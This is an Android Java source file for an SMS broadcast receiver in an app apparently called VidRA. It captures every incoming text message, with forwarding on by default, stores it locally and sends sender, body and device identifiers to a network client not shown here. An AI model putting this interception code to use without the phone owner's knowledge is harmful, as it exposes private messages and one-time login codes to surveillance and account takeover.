package com.vidra.vidra_app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "VidRA_SMS";

    private static final String SETTINGS_PREFS = "vidra_sender_settings";
    private static final String STORAGE_PREFS = "vidra_native_storage";

    private static final String KEY_SMS_FORWARDING = "smsForwarding";
    private static final String KEY_DEVICE_NAME = "deviceName";
    private static final String KEY_DEVICE_ID = "deviceId";

    private static final String SMS_LIST_KEY = "sms_messages";
    private static final int MAX_MESSAGES = 100;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (context == null || intent == null || intent.getExtras() == null) {
            return;
        }

        if (!isSmsForwardingEnabled(context)) {
            Log.d(TAG, "SMS forwarding disabled");
            return;
        }

        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");

        if (pdus == null || pdus.length == 0) {
            return;
        }

        String format = bundle.getString("format");
        String sender = "";
        StringBuilder messageBody = new StringBuilder();

        for (Object pdu : pdus) {
            SmsMessage smsMessage = createSmsMessage(pdu, format);

            if (smsMessage == null) {
                continue;
            }

            if (sender.isEmpty()) {
                sender = smsMessage.getDisplayOriginatingAddress();
            }

            messageBody.append(smsMessage.getMessageBody());
        }

        if (sender.isEmpty() && messageBody.length() == 0) {
            return;
        }

        long receivedAt = System.currentTimeMillis();

        try {
            JSONObject payload = buildPayload(
                    context,
                    sender,
                    messageBody.toString(),
                    receivedAt
            );

            saveSms(context, payload);
            NetworkClient.sendEvent(context, payload);

            Log.d(TAG, "Incoming SMS captured and processed");
        } catch (Exception e) {
            Log.e(TAG, "Failed to process SMS", e);
        }
    }

    private boolean isSmsForwardingEnabled(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(
                SETTINGS_PREFS,
                Context.MODE_PRIVATE
        );

        return prefs.getBoolean(KEY_SMS_FORWARDING, true);
    }

    private SmsMessage createSmsMessage(Object pdu, String format) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return SmsMessage.createFromPdu((byte[]) pdu, format);
            }

            return SmsMessage.createFromPdu((byte[]) pdu);
        } catch (Exception e) {
            Log.e(TAG, "Failed to create SMS message", e);
            return null;
        }
    }

    private JSONObject buildPayload(
            Context context,
            String sender,
            String body,
            long receivedAt
    ) throws Exception {
        SharedPreferences prefs = context.getSharedPreferences(
                SETTINGS_PREFS,
                Context.MODE_PRIVATE
        );

        String deviceName = prefs.getString(
                KEY_DEVICE_NAME,
                Build.MANUFACTURER + " " + Build.MODEL
        );

        String deviceId = prefs.getString(KEY_DEVICE_ID, "");

        JSONObject payload = new JSONObject();
        payload.put("id", "sms_" + receivedAt);
        payload.put("type", "sms");
        payload.put("sender", sender);
        payload.put("app", "");
        payload.put("packageName", "");
        payload.put("title", sender);
        payload.put("text", body);
        payload.put("deviceName", deviceName == null ? Build.MODEL : deviceName);
        payload.put("deviceId", deviceId == null ? "" : deviceId);
        payload.put("status", "received");
        payload.put("receivedAt", receivedAt);

        return payload;
    }

    private void saveSms(Context context, JSONObject message) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    STORAGE_PREFS,
                    Context.MODE_PRIVATE
            );

            String currentJson = prefs.getString(SMS_LIST_KEY, "[]");
            JSONArray oldMessages = new JSONArray(currentJson);
            JSONArray newMessages = new JSONArray();

            newMessages.put(message);

            int limit = Math.min(oldMessages.length(), MAX_MESSAGES - 1);
            for (int i = 0; i < limit; i++) {
                newMessages.put(oldMessages.getJSONObject(i));
            }

            prefs.edit()
                    .putString(SMS_LIST_KEY, newMessages.toString())
                    .apply();

            Log.d(TAG, "SMS saved to native storage");
        } catch (Exception e) {
            Log.e(TAG, "Failed to save SMS", e);
        }
    }
}